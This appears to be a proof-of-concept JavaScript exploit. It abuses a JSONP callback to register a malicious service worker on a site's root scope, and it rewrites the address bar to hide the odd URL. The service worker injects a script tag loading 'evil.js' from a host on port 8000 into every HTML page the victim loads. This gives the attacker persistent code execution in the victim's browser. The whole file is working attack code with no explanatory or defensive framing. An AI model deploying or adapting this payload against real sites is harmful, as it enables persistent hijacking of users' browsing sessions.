history.replaceState(null, "", "/welcome?name=User"); // Hides bizarre URL but does not change page

let jsonp = '/data?callback=';

// Code derived from http://craig-russell.co.uk/2016/01/26/modifying-service-worker-responses.html
let sw = 'onfetch=function(e){' +
        //'console.log( e.request.url );' +
        'if ( (!(e.request.url.indexOf(\":8000\") > 0) )) {' + //Doesn't contain malious domain port
                'e.respondWith(' +
                    'fetch(e.request).then(function(r){' +
                        'let data = { status: r.status, statusText: r.statusText, headers: {} };' +
                        'r.headers.forEach(function(v,k){data.headers[k] = v;});' +
                        'return r.text().then(function(body){' +
                            'let end = body.indexOf(\"<\/body>\");' +
                            'if (\"content-type\" in data.headers){' +
                                //'console.log(data.headers[\"content-type\"]);'+
                                //If we know its html
                                'if (data.headers[\"content-type\"].indexOf(\"html\") != -1){' +
                                    'let script = \"<script+src=\'http:\/\/127.0.0.1:8000\/evil.js\' type=\'text/javascript\'><\/script>\";' +
                                    'let newBody = body.slice(0,end).concat(script, body.slice(end, body.length));' +
                                    //'console.log(newBody);'+
                                    'return new Response(newBody, data);' +
                                '} else {return fetch(e.request)} '+ //Has content type, not html

                            '} else {return fetch(e.request)}' + // has no content types
                        '})'+ // end .text()
                    '})' + //end fetch
                ');' + // end respond with
        '} else {' +
            'fetch(e.request);' +
        '}}//';



if ("serviceWorker" in navigator) {
    navigator.serviceWorker.register(jsonp + sw, {scope: '/'});
}